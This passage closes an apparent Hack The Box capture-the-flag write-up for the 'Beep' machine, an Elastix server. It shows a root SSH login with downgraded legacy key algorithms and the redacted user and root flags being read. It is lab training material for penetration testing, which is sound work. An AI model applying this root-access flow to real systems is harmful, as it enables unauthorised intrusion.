ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '10.10.14.120' is not allowed to connect to this MySQL server
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/htb/beep]
└─$ ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 \
    -oHostKeyAlgorithms=+ssh-rsa \
    -oPubkeyAcceptedAlgorithms=+ssh-rsa \
root@10.129.229.183
root@10.129.229.183's password: 
Last login: Wed Nov 15 12:55:38 2023

Welcome to Elastix 
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.129.229.183

[root@beep ~]#
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=sshroot %}

<br />
Get the user.txt flag.

{% capture userflag %}
[root@beep fanis]# cat user.txt 
<redacted>
[root@beep fanis]# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000
    link/ether 00:50:56:b0:f0:f7 brd ff:ff:ff:ff:ff:ff
    inet 10.129.229.183/16 brd 10.129.255.255 scope global eth0
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=userflag %}

<br />
Get the root.txt flag.

{% capture rootflag %}
[root@beep ~]# cat root.txt
<redacted>
[root@beep ~]# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000
    link/ether 00:50:56:b0:f0:f7 brd ff:ff:ff:ff:ff:ff
    inet 10.129.229.183/16 brd 10.129.255.255 scope global eth0
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=rootflag %}

<br />
And with that flag safely in the keep, we safely cracked Beep.  Time to take the next one.